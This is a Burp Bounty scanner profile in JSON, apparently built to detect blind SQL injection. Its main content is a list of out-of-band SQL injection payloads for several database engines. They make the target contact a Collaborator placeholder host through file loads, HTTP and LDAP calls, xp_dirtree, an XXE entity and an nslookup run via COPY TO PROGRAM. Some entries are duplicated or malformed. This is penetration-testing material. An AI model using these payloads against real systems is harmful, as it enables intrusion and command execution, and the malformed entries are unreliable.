[
  {
    "ProfileName": "SQLi_Collaborator",
    "Name": "",
    "Enabled": true,
    "Scanner": 1,
    "Author": "@burpbounty",
    "Payloads": [
      "OR (SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      "OR (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "OR (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "OR (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "OR (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "OR (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "OR (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "OR (declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;)--",
      "OR declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      "OR exec master..xp_dirtree \u0027//{BC}/a\u0027",
      "OR SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      "OR copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      "OR LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      "OR SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027",
      ";declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      ";(SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      ";(SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      ";(SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      ";(SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      ";exec master..xp_dirtree \u0027//{BC}/a\u0027",
      ";SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      ";copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      ";LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      ";SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027",
      "and (SELECT LOAD_FILE(\u0027\\\\\\\\\u0027,\u0027{BC}\u0027))",
      "and (SELECT UTL_HTTP.REQUEST(\u0027http://{BC}\u0027) FROM DUAL)",
      "and (SELECT UTL_INADDR.get_host_addr((\u0027http://{BC}\u0027) FROM DUAL)",
      "and (SELECT SYS.DBMS_LDAP.INIT(\u0027{BC}\u0027,80) FROM DUAL)",
      "and (declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;)--",
      "and declare @q varchar(99);set @q\u003d\u0027\\\\{BC}\u0027; exec master.dbo.xp_dirtree @q;--",
      "and exec master..xp_dirtree \u0027//{BC}/a\u0027",
      "and SELECT extractvalue(xmltype(\u0027\u003c?xml version\u003d\"1.0\" encoding\u003d\"UTF-8\"?\u003e\u003c!DOCTYPE root [ \u003c!ENTITY % remote SYSTEM \"http://{BC}/\"\u003e %remote;]\u003e\u0027),\u0027/l\u0027) FROM dual",
      "and copy (SELECT \u0027\u0027) to program \u0027nslookup {BC}\u0027",
      "and LOAD_FILE(\u0027\\\\\\\\{BC}\\\\a\u0027)",
      "and SELECT ... INTO OUTFILE \u0027\\\\\\\\{BC}\\a\u0027"
    ],
    "Encoder": [],
    "UrlEncode": true,
    "CharsToUrlEncode": "\u0026#",
    "Grep": [],
    "Tags": [
      "SQLI",
      "All"
    ],
    "PayloadResponse": false,
    "NotResponse": false,
    "TimeOut1": "",
    "TimeOut2": "",
    "isTime": false,
    "contentLength": "",
    "iscontentLength": false,
    "CaseSensitive": false,
    "ExcludeHTTP": false,
    "OnlyHTTP": false,
    "IsContentType": false,
    "ContentType": "",
    "HttpResponseCode": "",
    "NegativeCT": false,
    "IsResponseCode": false,
    "ResponseCode": "",
    "NegativeRC": false,
    "urlextension": "",
    "isurlextension": false,
    "NegativeUrlExtension": false,
    "MatchType": 1,
    "Scope": 0,
    "RedirType": 4,
    "MaxRedir": 3,
    "payloadPosition": 2,
    "payloadsFile": "",
    "grepsFile": "",
    "IssueName": "SQLi_Collaborator",
    "IssueSeverity": "High",
    "IssueConfidence": "Certain",
    "IssueDetail": "",
    "RemediationDetail": "",
    "IssueBackground": "",
    "RemediationBackground": "",
    "Header": [],
    "VariationAttributes": [],
    "InsertionPointType": [
      65,
      32,
      36,
      1,
      2,
      6,
      5,
      35,
      34,
      64,
      0,
      3,
      4
    ],
    "Scanas": false,
    "Scantype": 0,
    "pathDiscovery": false
  }
]